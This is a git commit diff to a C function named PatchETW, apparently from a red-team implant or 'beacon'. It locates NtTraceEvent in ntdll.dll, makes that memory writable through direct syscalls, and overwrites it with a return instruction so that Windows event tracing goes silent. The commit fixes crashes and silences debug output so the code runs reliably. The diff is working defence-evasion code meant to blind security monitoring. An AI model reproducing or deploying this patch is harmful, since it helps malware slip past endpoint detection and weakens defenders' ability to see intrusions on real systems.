f53c3c105401c4de5d2be67e64737fc423341ff6
Sean Hopkins <88900815+seahop@users.noreply.github.com>
2022-03-30 17:07:21 -0500

    update patchETW function
    fixed some scoping issues that caused beacon to crash. and cleaned up some open handles

--- patchETW.c
+++ patchETW.c
@@ -3,12 +3,8 @@
 #include "syscalls.h"
 #include "patch.h"
 
-VOID PatchETW() {
-    HANDLE hDll = GetModuleHandleA(L"ntdll.dll");
-    PULONG dwOld = 0;
-    PSIZE_T length = 1;
-    HANDLE hProc = GetCurrentProcess();
-    PVOID base_addr = NULL;
+BOOL PatchETW() {
+    HANDLE hDll = GetModuleHandleA("ntdll.dll");
 
     if (hDll != 0) {
 
@@ -18,8 +14,11 @@ VOID PatchETW() {
             CHAR* addr_offset = address + 3;
             CHAR* addr_offset_bak = addr_offset;
             PVOID buffer = "\xc3";
+            HANDLE hProc = GetCurrentProcess();
+            PSIZE_T length = 1;
+            PULONG dwOld = 0;
 
-            printf("NtTraceEvent is at 0x%p\n", addr_offset);
+            //printf("NtTraceEvent is at 0x%p\n", addr_offset);
 
             NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &addr_offset, &length, PAGE_EXECUTE_READWRITE, &dwOld);
             //getchar();
@@ -28,11 +27,14 @@ VOID PatchETW() {
 
             //getchar();
             NTSTATUS NTPVM_bak = NtProtectVirtualMemory(hProc, &addr_offset_bak, &length, dwOld, &dwOld);
+            CloseHandle(hProc);
         }
-        CloseHandle(hDll);
     }
     else {
-        printf("Error\n");
+        //printf("Error\n");
+        return 0;
     }
-    return;
+
+    CloseHandle(hDll);
+    return 1;
 }
